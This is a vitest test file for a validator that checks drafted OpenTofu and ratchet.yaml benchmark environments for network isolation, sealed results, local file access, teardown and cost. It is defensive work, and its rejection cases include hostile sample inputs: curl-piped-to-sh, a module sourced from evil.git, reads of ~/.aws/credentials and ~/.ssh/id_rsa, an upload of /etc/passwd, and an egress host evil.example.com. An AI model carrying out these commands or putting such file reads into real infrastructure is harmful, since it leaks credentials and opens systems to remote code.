import { describe, expect, it } from 'vitest';
import { applyEnvironmentToConfigYaml } from './config-yaml.js';
import { validateEnvironment, type EnvironmentCheckId, type ValidateEnvironmentInput } from './validate.js';
import type { EnvironmentFile } from './types.js';

const CONFIG = `version: 0
objective:
  metric: http_req_duration.p95
  direction: minimize
evaluator:
  template: http-latency
`;

const D = 'infra/ratchet';

const MAIN_TF = `module "sandbox" {
  source  = "./ratchet-sandbox"
  ratchet = var.ratchet

  machines = {
    api = {
      role          = "app"
      label         = "API"
      detail        = "the service"
      instance_type = "c7i.2xlarge"
      user_data     = file("\${path.module}/api.sh")
    }
    db = {
      role           = "database"
      label          = "Postgres"
      instance_type  = "r7g.large"
      data_volume_gb = 100
    }
  }
}
`;

const good = (over: { main?: string; scope?: 'none' | 'single' | 'full'; extra?: EnvironmentFile[]; config?: string } = {}): ValidateEnvironmentInput => {
  const scope = over.scope ?? 'full';
  return {
    scope,
    originalConfigYaml: CONFIG,
    files: [
      { path: 'ratchet.yaml', content: over.config ?? applyEnvironmentToConfigYaml(CONFIG, { scope }) },
      { path: `${D}/main.tf`, content: over.main ?? MAIN_TF },
      { path: `${D}/api.sh`, content: '#!/bin/bash\nset -e\ndocker run -d repo:ratchet\n' },
      ...(over.extra ?? []),
    ],
  };
};

const failing = (r: ReturnType<typeof validateEnvironment>): EnvironmentCheckId[] => r.checks.filter((c) => !c.ok).map((c) => c.id as EnvironmentCheckId);
const detail = (r: ReturnType<typeof validateEnvironment>, id: EnvironmentCheckId): string => r.checks.find((c) => c.id === id)!.detail;
const withMain = (extra: string, scope: 'full' | 'single' = 'full') => good({ main: `${MAIN_TF}\n${extra}`, scope });

describe('validateEnvironment: a good draft', () => {
  it('passes every static check and reports the machines, the rows and the cost', () => {
    const r = validateEnvironment(good());
    expect(failing(r)).toEqual([]);
    expect(r.ok).toBe(true);
    expect(r.checks.map((c) => c.id)).toEqual(['isolated', 'sealed', 'same-hardware', 'teardown', 'files', 'syntax', 'config', 'scope', 'base-module', 'local-access', 'tagged', 'cost']);
    expect(r.machines.map((m) => [m.key, m.name, m.machine, m.role])).toEqual([
      ['api', 'API', 'c7i.2xlarge', 'app'],
      ['db', 'Postgres', 'r7g.large', 'database'],
    ]);
    expect(r.resources.map((x) => x.name)).toEqual(['API', 'Postgres']);
    // c7i.2xlarge 0.357 + r7g.large 0.1071 + gp3 for 30+30+100 GB
    expect(r.cost.usdPerHour).toBeGreaterThan(0.357 + 0.1071);
    expect(r.cost.startupMinutes).toBe(4);
  });

  it('scope none needs only ratchet.yaml and is priced as the evaluator host', () => {
    const r = validateEnvironment({ scope: 'none', originalConfigYaml: CONFIG, files: [{ path: 'ratchet.yaml', content: applyEnvironmentToConfigYaml(CONFIG, { scope: 'none' }) }] });
    expect(r.ok).toBe(true);
    expect(r.machines.map((m) => m.role)).toEqual(['evaluator']);
  });

  it('scope single without OpenTofu pins the machine from ratchet.yaml and may carry a Dockerfile', () => {
    const cfg = applyEnvironmentToConfigYaml(CONFIG, { scope: 'single', machine: 'c7i.xlarge', image: `${D}/Dockerfile` });
    const r = validateEnvironment({ scope: 'single', originalConfigYaml: CONFIG, files: [{ path: 'ratchet.yaml', content: cfg }, { path: `${D}/Dockerfile`, content: 'FROM node:22\n' }] });
    expect(r.ok).toBe(true);
    expect(r.machines).toMatchObject([{ machine: 'c7i.xlarge', role: 'app' }]);
  });

  it('a heredoc user_data and inline machine objects are fine', () => {
    const main = `module "sandbox" {
  source  = "./ratchet-sandbox"
  ratchet = var.ratchet
  machines = {
    a = { role = "app", instance_type = "c7i.large", user_data = <<-EOT
      #!/bin/bash
      echo hi
    EOT
    }
  }
}
`;
    expect(failing(validateEnvironment(good({ main, scope: 'single' })))).toEqual([]);
  });
});

describe('validateEnvironment: isolation (no internet on measuring hosts)', () => {
  it.each([
    ['a public address on a raw instance', 'resource "aws_instance" "x" {\n  associate_public_ip_address = true\n  tags = module.sandbox.tags\n}\n'],
    ['an internet gateway', 'resource "aws_internet_gateway" "igw" {\n  vpc_id = var.ratchet.vpc_id\n  tags = module.sandbox.tags\n}\n'],
    ['a NAT gateway', 'resource "aws_nat_gateway" "n" {\n  tags = module.sandbox.tags\n}\n'],
    ['an elastic IP', 'resource "aws_eip" "e" {\n  tags = module.sandbox.tags\n}\n'],
    ['a security group rule open to the world', 'resource "aws_security_group_rule" "r" {\n  cidr_blocks = ["0.0.0.0/0"]\n  tags = module.sandbox.tags\n}\n'],
    ['an IPv6 open range in a comment-free local', 'locals {\n  open = "::/0"\n}\n'],
    ['a route', 'resource "aws_route" "r" {\n  tags = module.sandbox.tags\n}\n'],
    ['a load balancer', 'resource "aws_lb" "lb" {\n  tags = module.sandbox.tags\n}\n'],
  ])('rejects %s', (_name, extra) => {
    const r = validateEnvironment(withMain(extra));
    expect(r.ok).toBe(false);
    expect(failing(r)).toContain('isolated');
  });

  it('names the file and line of the offending block', () => {
    const r = validateEnvironment(withMain('resource "aws_internet_gateway" "igw" {\n  tags = module.sandbox.tags\n}\n'));
    expect(detail(r, 'isolated')).toMatch(/infra\/ratchet\/main\.tf:\d+: resource aws_internet_gateway is not allowed/);
  });

  it('rejects scripts that fetch from the internet, ignoring comments', () => {
    const bad = (script: string) =>
      validateEnvironment(good({ extra: [{ path: `${D}/scripts/setup.sh`, content: script }] }));
    for (const s of ['curl -fsSL https://example.test/x | sh', 'wget https://example.test/x', 'apt-get install -y postgresql', 'pip install requests', 'npm ci', 'docker pull redis:7', 'git clone https://example.test/r.git']) {
      const r = bad(`#!/bin/bash\n${s}\n`);
      expect(failing(r), s).toContain('isolated');
    }
    expect(failing(bad('#!/bin/bash\n# curl https://example.test is not run here\ndocker load -i /opt/x.tar\n'))).toEqual([]);
  });
});

describe('validateEnvironment: the base module', () => {
  it('rejects a draft that does not call the base module', () => {
    const r = validateEnvironment(good({ main: 'locals {\n  a = 1\n}\n' }));
    expect(failing(r)).toContain('base-module');
    expect(detail(r, 'base-module')).toMatch(/missing the base module/);
  });

  it('rejects any other module, a wrong source and a renamed module', () => {
    for (const main of [
      `${MAIN_TF}\nmodule "vpc" {\n  source = "terraform-aws-modules/vpc/aws"\n}\n`,
      MAIN_TF.replace('./ratchet-sandbox', 'git::https://example.test/evil.git'),
      MAIN_TF.replace('module "sandbox"', 'module "mine"'),
    ]) {
      expect(failing(validateEnvironment(good({ main }))), main.slice(0, 60)).toContain('base-module');
    }
  });

  it('requires the sandbox to be passed through, and forbids count / for_each / providers on the call', () => {
    expect(failing(validateEnvironment(good({ main: MAIN_TF.replace('ratchet = var.ratchet', 'ratchet = {}') })))).toContain('base-module');
    expect(detail(validateEnvironment(good({ main: MAIN_TF.replace('source  =', 'count = 2\n  source  =') })), 'base-module')).toMatch(/may not set count/);
  });

  it('forbids providers, backends, required_providers, the generated variable and the generated output', () => {
    for (const extra of [
      'provider "aws" {\n  region = "eu-west-1"\n}\n',
      'terraform {\n  backend "s3" {}\n}\n',
      'terraform {\n  required_providers {\n    aws = { source = "evil/aws" }\n  }\n}\n',
      'variable "ratchet" {\n  type = any\n}\n',
      'output "environment" {\n  value = 1\n}\n',
    ]) {
      const r = validateEnvironment(withMain(extra));
      expect(r.ok, extra).toBe(false);
    }
  });

  it('forbids machine keys that place or identify a machine, and unknown roles', () => {
    const r = validateEnvironment(good({ main: MAIN_TF.replace('role          = "app"', 'role = "app"\n      subnet_id = "subnet-123"\n      iam_instance_profile = "admin"') }));
    expect(failing(r)).toContain('sealed');
    expect(detail(r, 'sealed')).toMatch(/sets "subnet_id"/);
    expect(failing(validateEnvironment(good({ main: MAIN_TF.replace('"app"', '"admin"') })))).toContain('base-module');
  });

  it('limits the number of machines', () => {
    const many = Array.from({ length: 9 }, (_, i) => `    m${i} = { role = "other", instance_type = "c7i.large", label = "M${i}" }`).join('\n');
    const r = validateEnvironment(good({ main: `module "sandbox" {\n  source = "./ratchet-sandbox"\n  ratchet = var.ratchet\n  machines = {\n${many}\n  }\n}\n` }));
    expect(detail(r, 'base-module')).toMatch(/9 machines/);
  });
});

describe('validateEnvironment: sealed results, identities and the holdout', () => {
  it.each([
    ['an IAM role', 'resource "aws_iam_role" "r" {\n  tags = module.sandbox.tags\n}\n'],
    ['an IAM policy attachment', 'resource "aws_iam_role_policy_attachment" "a" {\n}\n'],
    ['an instance profile', 'resource "aws_instance" "x" {\n  iam_instance_profile = "p"\n  tags = module.sandbox.tags\n}\n'],
    ['a reference to the sealed store', 'locals {\n  b = "ratchet-demo-sealed"\n}\n'],
    ['a reference to the results prefix', 'locals {\n  b = "bench-results/"\n}\n'],
    ['an s3 object outside env/', 'resource "aws_s3_object" "o" {\n  bucket = module.sandbox.artifacts_bucket\n  key = "bench-inputs/x"\n  content = "x"\n  tags = module.sandbox.tags\n}\n'],
    ['an s3 object in another bucket', 'resource "aws_s3_object" "o" {\n  bucket = "somebody-elses-bucket"\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n}\n'],
  ])('rejects %s', (_n, extra) => {
    const r = validateEnvironment(withMain(extra));
    expect(r.ok).toBe(false);
    expect(failing(r).some((id) => id === 'sealed' || id === 'isolated')).toBe(true);
  });

  it('accepts seed data under env/ in the artifacts bucket, tagged', () => {
    const extra = 'resource "aws_s3_object" "seed" {\n  bucket  = module.sandbox.artifacts_bucket\n  key     = "env/seed/orders.sql"\n  content = file("${path.module}/seed.sql")\n  tags    = module.sandbox.tags\n}\n';
    const r = validateEnvironment({ ...withMain(extra), files: [...withMain(extra).files, { path: `${D}/seed.sql`, content: 'select 1;' }] });
    expect(failing(r)).toEqual([]);
  });
});

describe('validateEnvironment: tags', () => {
  it('rejects a resource without the sandbox tags', () => {
    const extra = 'resource "aws_s3_object" "seed" {\n  bucket  = module.sandbox.artifacts_bucket\n  key     = "env/seed.sql"\n  content = "x"\n}\n';
    const r = validateEnvironment(withMain(extra));
    expect(failing(r)).toEqual(['tagged']);
    expect(detail(r, 'tagged')).toMatch(/aws_s3_object\.seed must set tags = module\.sandbox\.tags/);
  });

  it('accepts tags merged with the sandbox tags', () => {
    const extra = 'resource "aws_s3_object" "seed" {\n  bucket  = var.ratchet.artifacts_bucket\n  key     = "env/seed.sql"\n  content = "x"\n  tags    = merge(module.sandbox.tags, { a = "b" })\n}\n';
    expect(failing(validateEnvironment(withMain(extra)))).toEqual([]);
  });
});

describe('validateEnvironment: same hardware', () => {
  it('requires literal instance types and a literal machines map', () => {
    expect(failing(validateEnvironment(good({ main: MAIN_TF.replace('"c7i.2xlarge"', 'var.size') })))).toContain('same-hardware');
    expect(failing(validateEnvironment(good({ main: MAIN_TF.replace('"c7i.2xlarge"', '"${var.family}.2xlarge"') })))).toContain('same-hardware');
    const r = validateEnvironment(good({ main: 'module "sandbox" {\n  source = "./ratchet-sandbox"\n  ratchet = var.ratchet\n  machines = var.machines\n}\n', scope: 'single' }));
    expect(detail(r, 'same-hardware')).toMatch(/literal map/);
  });

  it('rejects burstable types for the machines the metric is measured on, allows them for a cache', () => {
    const r = validateEnvironment(good({ main: MAIN_TF.replace('"c7i.2xlarge"', '"t3.large"') }));
    expect(failing(r)).toEqual(['same-hardware']);
    expect(detail(r, 'same-hardware')).toMatch(/burstable/);
    const cache = MAIN_TF.replace('"r7g.large"', '"t4g.medium"').replace('"database"', '"cache"');
    expect(failing(validateEnvironment(good({ main: cache })))).toEqual([]);
  });
});

describe('validateEnvironment: teardown', () => {
  it.each([
    ['prevent_destroy', 'resource "aws_s3_object" "o" {\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n  lifecycle {\n    prevent_destroy = true\n  }\n}\n'],
    ['deletion protection', 'locals {\n}\nresource "aws_s3_object" "o" {\n  deletion_protection = true\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n}\n'],
    ['an import block', 'import {\n  to = aws_s3_object.o\n  id = "x"\n}\n'],
    ['force_destroy = false', 'resource "aws_s3_object" "o" {\n  force_destroy = false\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n}\n'],
  ])('rejects %s', (_n, extra) => {
    expect(failing(validateEnvironment(withMain(extra)))).toContain('teardown');
  });
});

describe('validateEnvironment: nothing runs or is read on the user machine', () => {
  it.each([
    ['a local-exec provisioner', 'resource "aws_s3_object" "o" {\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n  provisioner "local-exec" {\n    command = "curl x"\n  }\n}\n'],
    ['an external data source', 'data "external" "e" {\n  program = ["sh", "-c", "id"]\n}\n'],
    ['path.cwd', 'locals {\n  p = path.cwd\n}\n'],
    ['a data source outside the allow-list', 'data "aws_ami" "a" {\n  most_recent = true\n}\n'],
  ])('rejects %s', (_n, extra) => {
    expect(failing(validateEnvironment(withMain(extra)))).toContain('local-access');
  });

  it('rejects file() outside the draft and file() of a file that is not in it', () => {
    const abs = validateEnvironment(good({ main: MAIN_TF.replace('file("${path.module}/api.sh")', 'file("/home/user/.aws/credentials")') }));
    expect(failing(abs)).toContain('local-access');
    const up = validateEnvironment(good({ main: MAIN_TF.replace('file("${path.module}/api.sh")', 'file("${path.module}/../../.env")') }));
    expect(failing(up)).toContain('local-access');
    const missing = validateEnvironment(good({ main: MAIN_TF.replace('api.sh', 'nope.sh') }));
    expect(detail(missing, 'local-access')).toMatch(/nope\.sh, which is not part of the draft/);
    const home = validateEnvironment(good({ main: MAIN_TF.replace('file("${path.module}/api.sh")', 'file(pathexpand("~/.ssh/id_rsa"))') }));
    expect(failing(home)).toContain('local-access');
  });

  it('rejects an s3 object that uploads a local file by absolute path', () => {
    const extra = 'resource "aws_s3_object" "o" {\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  source = "/etc/passwd"\n  tags = module.sandbox.tags\n}\n';
    expect(failing(validateEnvironment(withMain(extra)))).toContain('local-access');
  });
});

describe('validateEnvironment: files', () => {
  it('only ratchet.yaml and infra/ratchet/ may be part of a draft', () => {
    const r = validateEnvironment(good({ extra: [{ path: 'src/server.ts', content: 'x' }, { path: 'bench/run.mjs', content: 'x' }] }));
    expect(failing(r)).toEqual(['files']);
    expect(detail(r, 'files')).toMatch(/src\/server\.ts: a drafted environment may only change ratchet\.yaml and files under infra\/ratchet\//);
  });

  it.each([
    ['a path that leaves the repo', '../x'],
    ['an absolute path', '/etc/x'],
    ['a .git path', `${D}/.git/config`],
    ['a tfvars file', `${D}/prod.tfvars`],
    ['an override file', `${D}/main_override.tf`],
    ['JSON configuration', `${D}/extra.tf.json`],
    ['a generated file', `${D}/ratchet_inputs.tf`],
    ['a copy of the base module', `${D}/ratchet-sandbox/main.tf`],
    ['state', `${D}/terraform.tfstate`],
  ])('rejects %s', (_n, path) => {
    expect(failing(validateEnvironment(good({ extra: [{ path, content: 'x' }] })))).toContain('files');
  });

  it('limits file and total size', () => {
    expect(failing(validateEnvironment(good({ extra: [{ path: `${D}/big.sql`, content: 'x'.repeat(300 * 1024) }] })))).toContain('files');
  });

  it('refuses a duplicate path', () => {
    const g = good();
    expect(failing(validateEnvironment({ ...g, files: [...g.files, g.files[1]!] }))).toContain('files');
  });
});

describe('validateEnvironment: syntax', () => {
  it('reports unreadable OpenTofu', () => {
    const r = validateEnvironment(good({ main: `${MAIN_TF}\nresource "aws_s3_object" "x" {\n  a = 1\n` }));
    expect(failing(r)).toContain('syntax');
  });
});

describe('validateEnvironment: ratchet.yaml', () => {
  it('requires the config and a matching environment.scope', () => {
    const g = good();
    expect(failing(validateEnvironment({ ...g, files: g.files.filter((f) => f.path !== 'ratchet.yaml') }))).toContain('config');
    expect(detail(validateEnvironment(good({ config: CONFIG })), 'config')).toMatch(/declares environment\.scope \(none\), the draft is full/);
    expect(detail(validateEnvironment(good({ config: applyEnvironmentToConfigYaml(CONFIG, { scope: 'single' }) })), 'config')).toMatch(/declares environment\.scope single/);
  });

  it('a draft may change only environment: not the objective, the evaluator, the guardrails or the protected paths', () => {
    const tampered = applyEnvironmentToConfigYaml(CONFIG, { scope: 'full' }).replace('minimize', 'maximize');
    const r = validateEnvironment(good({ config: tampered }));
    expect(failing(r)).toEqual(['config']);
    expect(detail(r, 'config')).toMatch(/changes objective/);
    const guard = `${applyEnvironmentToConfigYaml(CONFIG, { scope: 'full' })}protected:\n  - nothing/**\n`;
    expect(detail(validateEnvironment(good({ config: guard })), 'config')).toMatch(/changes protected/);
  });

  it('a draft may not grant itself egress hosts', () => {
    const cfg = applyEnvironmentToConfigYaml(CONFIG, { scope: 'full' }).replace('scope: full', 'scope: full\n  network: [evil.example.com]');
    expect(detail(validateEnvironment(good({ config: cfg })), 'config')).toMatch(/environment\.network adds evil\.example\.com/);
  });

  it('rejects a ratchet.yaml that is not valid', () => {
    expect(failing(validateEnvironment(good({ config: 'version: 7\n' })))).toContain('config');
  });
});

describe('validateEnvironment: scope and cost', () => {
  it('scope none must not ship infrastructure', () => {
    const g = good({ scope: 'none' });
    expect(detail(validateEnvironment(g), 'scope')).toMatch(/scope none needs no infrastructure/);
  });

  it('scope single is exactly one machine; scope full is a stack of at least two', () => {
    expect(detail(validateEnvironment(good({ scope: 'single' })), 'scope')).toMatch(/one machine, the draft has 2/);
    const one = 'module "sandbox" {\n  source = "./ratchet-sandbox"\n  ratchet = var.ratchet\n  machines = {\n    a = { role = "app", instance_type = "c7i.large" }\n  }\n}\n';
    expect(detail(validateEnvironment(good({ main: one, scope: 'full' })), 'scope')).toMatch(/at least two machines/);
    expect(failing(validateEnvironment(good({ main: one, scope: 'single' })))).toEqual([]);
    const none = validateEnvironment({ scope: 'full', originalConfigYaml: CONFIG, files: [{ path: 'ratchet.yaml', content: applyEnvironmentToConfigYaml(CONFIG, { scope: 'full' }) }] });
    expect(detail(none, 'scope')).toMatch(/needs OpenTofu/);
  });

  it('rejects an instance type with no known price (the cost has to be shown before anything is created)', () => {
    const r = validateEnvironment(good({ main: MAIN_TF.replace('"c7i.2xlarge"', '"x2gd.metal"') }));
    expect(failing(r)).toEqual(['cost']);
    expect(detail(r, 'cost')).toMatch(/no price known for x2gd\.metal/);
  });

  it('module-only mode (what the engine and the provider re-check on apply) skips the config check', () => {
    const g = good();
    const r = validateEnvironment({ scope: 'full', moduleOnly: true, files: g.files.filter((f) => f.path !== 'ratchet.yaml') });
    expect(failing(r)).toEqual([]);
    const bad = validateEnvironment({ scope: 'full', moduleOnly: true, files: [{ path: `${D}/main.tf`, content: `${MAIN_TF}\nresource "aws_internet_gateway" "i" {\n}\n` }] });
    expect(failing(bad)).toContain('isolated');
  });
});
